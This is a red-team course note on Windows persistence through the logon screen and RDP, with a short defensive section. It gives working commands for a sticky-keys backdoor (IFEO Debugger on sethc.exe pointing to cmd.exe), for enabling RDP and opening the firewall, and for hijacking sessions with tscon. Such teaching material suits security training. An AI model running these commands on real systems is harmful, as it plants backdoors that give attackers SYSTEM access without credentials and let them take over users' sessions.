---
tags: [c2, red-team, persistence, rdp, vapt]
difficulty: intermediate
module: "101 - Red Team Initial Access and Payload Delivery"
topic: "101.06 RDP and Accessibility Persistence"
---

# RDP and Accessibility Persistence

## Introduction
Once a foothold is established, red teams want **durable, low-noise re-entry**. Two closely related Windows persistence families abuse the **Remote Desktop / logon screen** surface: **accessibility-feature backdoors** (the "sticky keys" class — replacing or hijacking accessibility binaries that run as SYSTEM *at the logon screen, before authentication*) and **RDP-specific persistence** (enabling RDP, allowing multiple/shadow sessions, RDP hijacking, and sticky-host tricks). They are favored because they blend with a legitimate admin remote-access workflow and can grant SYSTEM access from the pre-auth logon UI. This complements the OS persistence notes in the privilege-escalation modules ([[15 - Registry Autorun Key Abuse]], [[13 - Scheduled Task Hijacking]]).

## Accessibility (Sticky Keys) Backdoors
At the Windows logon screen, certain **accessibility helpers run as SYSTEM** before anyone logs in. Replacing or redirecting them yields a SYSTEM shell from the logon/RDP screen:
```text
+---------------------------------------------------------------+
|            STICKY-KEYS / ACCESSIBILITY BACKDOOR             |
+---------------------------------------------------------------+
|  Triggers available at the LOGON screen (pre-auth):           |
|    sethc.exe   (Sticky Keys, press SHIFT x5)                  |
|    utilman.exe (Ease of Access button, Win+U)                 |
|    osk.exe / Narrator / Magnify                              |
|        |  these launch as SYSTEM                              |
|        v                                                       |
|  Backdoor methods:                                           |
|   (a) replace C:\Windows\System32\sethc.exe with cmd.exe      |
|   (b) IFEO "Debugger" registry hijack to launch cmd.exe       |
|        when sethc.exe/utilman.exe is invoked                  |
|        v                                                       |
|  At logon/RDP screen -> trigger -> SYSTEM cmd.exe             |
+---------------------------------------------------------------+
```
The cleaner method is the **Image File Execution Options (IFEO) "Debugger"** key (no binary replacement, survives file integrity checks on the original):
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
:: now pressing SHIFT 5x at the (RDP) logon screen -> SYSTEM cmd
```
Because the trigger works **at the logon screen of an RDP session**, this is remotely reachable SYSTEM access without credentials — a potent persistence + escalation primitive.

## RDP-Specific Persistence
```text
   - Enable RDP + open firewall (re-entry channel):
       reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
       netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
   - Add a stealth local admin / enable a dormant account for RDP login
   - RDP session hijacking: as SYSTEM, takeover a disconnected session
       (tscon) to resume another user's desktop WITHOUT their password
       query user & tscon <id> /dest:<your-session>
   - Shadow sessions / "Restricted Admin" mode abuse
   - Sticky/duplicate logon: allow multiple concurrent RDP sessions
```
**RDP session hijacking via `tscon`** is notable: a SYSTEM-context process can reconnect another user's *disconnected* session to itself, gaining their desktop and tokens without their password — both lateral movement and persistence.

## Why It Matters
These techniques give **pre-authentication SYSTEM access reachable over RDP** (sticky keys) and **legitimate-looking remote re-entry** (enabling/abusing RDP), making them durable across reboots and password changes. They're classic, widely-used persistence that defenders must specifically hunt because the components (RDP, accessibility tools) are legitimate.

## Defensive Notes
- **Detect IFEO Debugger keys** on accessibility binaries and any modification of `sethc.exe`/`utilman.exe`; baseline System32 binary hashes.
- **Network Level Authentication (NLA)** for RDP forces auth *before* the logon screen loads — blocks the sticky-keys-at-RDP-login path; require it everywhere.
- Restrict RDP exposure (no internet-facing RDP; jump hosts + MFA); monitor `fDenyTSConnections` changes and firewall rule edits.
- Alert on `tscon`/session reconnection by SYSTEM, new local admins, and RDP logons from unusual sources/times.

## Related Notes
- [[15 - Registry Autorun Key Abuse]]
- [[13 - Scheduled Task Hijacking]]
- [[20 - Pass the Hash on Local Admin]]
- [[12 - UAC Bypass Techniques]]
